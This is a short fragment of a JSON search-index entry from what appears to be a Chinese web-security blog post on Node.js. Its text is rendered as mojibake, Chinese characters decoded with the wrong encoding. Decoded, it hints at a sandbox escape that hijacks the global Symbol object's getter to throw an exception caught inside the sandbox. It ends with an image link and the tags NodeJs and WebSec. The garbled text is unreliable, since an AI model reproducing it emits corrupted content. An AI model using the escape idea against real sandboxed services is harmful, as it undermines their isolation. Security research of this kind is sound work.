å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­ç”¨åˆ°äº†Symbolå…¨å±€å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒSymbolå¯¹è±¡çš„getterå¹¶æŠ›å‡ºå¼‚å¸¸ï¼Œå†åœ¨æ²™ç®±å†…æ‹¿åˆ°è¿™ä¸ªå¼‚å¸¸å¯¹è±¡å°±å¯ä»¥äº†\n\n![image-20221023153034658](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210231530718.png)\n\n","tags":["NodeJs"],"categories":["WebSec"]}]